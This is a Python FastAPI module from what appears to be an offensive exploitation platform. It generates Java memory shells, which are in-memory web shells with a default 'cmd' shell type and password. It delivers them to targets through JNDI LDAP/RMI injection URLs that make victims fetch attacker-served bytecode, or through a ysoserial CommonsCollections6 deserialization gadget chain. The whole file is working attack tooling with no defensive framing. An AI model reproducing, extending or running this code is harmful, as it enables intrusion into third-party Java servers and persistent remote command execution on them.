from __future__ import annotations

import logging
from typing import Any

import httpx
from fastapi import APIRouter, Depends, HTTPException, status
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from ..auth.deps import current_user
from ..config import get_settings
from ..db import get_session
from ..models import OobToken, Project, User
from ..payloads.catalog import CATALOG_BY_ID
from ..payloads.jndi_builder import jndi_ldap_url, jndi_rmi_url
from ..schemas import MemshellRequest, MemshellResponse, PayloadResponse

log = logging.getLogger(__name__)
router = APIRouter(prefix="/api/memshells", tags=["memshells"])

MEMSHELL_IDS = [k for k in CATALOG_BY_ID if k.startswith("memshell_")]


@router.get("/catalog")
async def memshell_catalog(_user: User = Depends(current_user)) -> list[dict[str, Any]]:
    from ..payloads.router import _chain_out
    return [_chain_out(CATALOG_BY_ID[k]) for k in MEMSHELL_IDS]


async def _register_to_sidecar(sidecar_url: str, token: str, class_name: str, bytecode_b64: str, timeout: float) -> bool:
    """Push bytecode to sidecar RebindStore so LDAP/HTTP can serve it."""
    try:
        async with httpx.AsyncClient(timeout=timeout) as cli:
            r = await cli.post(
                f"{sidecar_url}/rebind/register",
                json={"token": token, "class_name": class_name, "bytecode_b64": bytecode_b64},
            )
        return r.status_code == 200
    except Exception as e:
        log.warning("sidecar rebind register failed: %s", e)
        return False


@router.post("/generate", response_model=MemshellResponse)
async def generate_memshell(
    body: MemshellRequest,
    user: User = Depends(current_user),
) -> MemshellResponse:
    s = get_settings()
    chain_id = f"memshell_{body.framework}_{body.type}"
    if chain_id not in CATALOG_BY_ID:
        candidates = [k for k in MEMSHELL_IDS if body.framework in k and body.type in k]
        if not candidates:
            raise HTTPException(status.HTTP_400_BAD_REQUEST,
                                f"no memshell for framework={body.framework} type={body.type}")
        chain_id = candidates[0]

    params = dict(body.params)
    params.setdefault("shell_type", "cmd")
    params.setdefault("password", "cmd")

    # Resolve token — check both body.token and params["token"]
    token = body.token or params.get("token") or ""

    # Ask sidecar for bytecode
    try:
        async with httpx.AsyncClient(timeout=s.sidecar_timeout) as cli:
            r = await cli.post(
                f"{s.sidecar_url}/memshell/generate",
                json={"chain": chain_id, "framework": body.framework,
                      "type": body.type, "params": params},
            )
        if r.status_code != 200:
            raise HTTPException(status.HTTP_502_BAD_GATEWAY, f"sidecar: {r.text[:200]}")
        data = r.json()
    except httpx.ConnectError:
        raise HTTPException(status.HTTP_503_SERVICE_UNAVAILABLE, "bytecode-service is not running")

    class_name = data.get("meta", {}).get("class_name") or data.get("class_name", "MemShell")
    bytecode_b64 = data.get("value") or data.get("bytecode_b64") or None
    meta = data.get("meta", {})

    # Auto-register bytecode to sidecar so LDAP/HTTP can serve it immediately
    if bytecode_b64 and token:
        registered = await _register_to_sidecar(s.sidecar_url, token, class_name, bytecode_b64, s.sidecar_timeout)
        meta["sidecar_registered"] = registered
        if registered:
            log.info("bytecode registered to sidecar for token=%s class=%s", token, class_name)

    # Build delivery payload
    deliver_via = body.deliver
    delivery_payload: PayloadResponse | None = None

    if deliver_via == "jndi_ldap" and token:
        url = jndi_ldap_url(token, s, class_name)
        delivery_payload = PayloadResponse(type="jndi_ldap", content_type="text/plain", value=url)

    elif deliver_via == "jndi_rmi" and token:
        url = jndi_rmi_url(token, s, class_name)
        delivery_payload = PayloadResponse(type="jndi_rmi", content_type="text/plain", value=url)

    elif deliver_via == "serialize" and bytecode_b64:
        # Wrap class bytes in CC6 gadget chain — works on JDK > 8u191 with gadget libs
        try:
            async with httpx.AsyncClient(timeout=s.sidecar_timeout) as cli:
                r2 = await cli.post(
                    f"{s.sidecar_url}/generate",
                    json={"chain": "ysoserial_cc6", "params": {"cmd": "", "bytecode_b64": bytecode_b64}},
                )
            if r2.status_code == 200:
                d2 = r2.json()
                delivery_payload = PayloadResponse(
                    type="serialize_cc6",
                    content_type=d2.get("content_type", "application/octet-stream"),
                    value=d2.get("value", ""),
                )
        except httpx.ConnectError:
            pass

    return MemshellResponse(
        framework=body.framework,
        type=body.type,
        class_name=class_name,
        bytecode_b64=bytecode_b64,
        payload=delivery_payload,
        meta=meta,
    )
